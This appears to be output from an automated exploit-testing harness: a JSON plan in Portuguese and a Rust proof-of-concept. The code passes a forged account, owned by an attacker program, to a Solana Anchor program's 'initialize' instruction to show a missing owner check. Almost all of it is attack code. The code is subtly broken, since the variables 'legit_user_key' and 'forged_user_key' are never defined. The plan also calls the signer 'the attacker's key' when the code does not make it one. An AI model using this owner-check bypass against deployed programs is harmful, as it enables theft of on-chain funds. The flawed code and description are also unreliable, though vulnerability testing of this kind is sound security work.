{
  "plan": "O cenário monta uma conta `user` forjada, cujo dono é um programa atacante (env.attacker_program) e cujos dados são a serialização Borsh da struct `User` com `discriminator = true` e `authority` arbitrário. O baseline usa a mesma instrução `initialize` com uma conta `user` legítima (dono = env.program_id) e dados válidos, provando que o cenário está correto. O ataque repete a chamada, mas substitui a conta `user` pela conta forjada, mantendo a mesma autoridade signatária. O efeito medido é que a conta forjada foi aceita e teve seu campo `authority` sobrescrito com a chave do atacante, demonstrando que o programa confiou em dados de um dono não verificado.",
  "scenario": "let authority = Pubkey::new_unique();
let attacker_program = env.attacker_program.unwrap_or_else(Pubkey::new_unique);

// Conta user legítima: dono é o programa-alvo, dados válidos
let legit_user_data = anchor_account_data("User", &(true, Pubkey::new_unique()));
let legit_user = account(&env.program_id, &legit_user_data, None);

// Conta user forjada: dono é o programa atacante, dados forjados
let forged_user_data = anchor_account_data("User", &(true, Pubkey::new_unique()));
let forged_user = account(&attacker_program, &forged_user_data, None);

let authority_account = wallet(1_000_000_000);

// Baseline: uso legítimo com a conta user correta
let ix_baseline = env.anchor_ix(
    "initialize",
    &(),
    &[
        AccountMeta::new(legit_user_key, false),
        AccountMeta::new_readonly(authority, true),
    ],
);
let contas_baseline = vec![
    (legit_user_key, legit_user),
    (authority, authority_account.clone()),
];
let r_base = env.baseline("initialize legítimo", &ix_baseline, &contas_baseline);

// Ataque: mesma instrução, mas com a conta user forjada (dono diferente)
let ix_attack = env.anchor_ix(
    "initialize",
    &(),
    &[
        AccountMeta::new(forged_user_key, false),
        AccountMeta::new_readonly(authority, true),
    ],
);
let contas_attack = vec![
    (forged_user_key, forged_user),
    (authority, authority_account),
];
let r = env.attack("initialize com user forjado", &ix_attack, &contas_attack);

if r.program_result == ProgramResult::Success {
    let user_after = after(&r, &forged_user_key);
    let authority_after = read_pubkey(user_after.data(), 1); // offset 1: após o bool discriminator
    env.effect(
        "authority da conta forjada foi sobrescrita com a chave do atacante",
        authority_after == authority,
    );
    env.effect(
        "conta forjada manteve dono diferente do programa-alvo",
        user_after.owner() == &attacker_program,
    );
}"
}

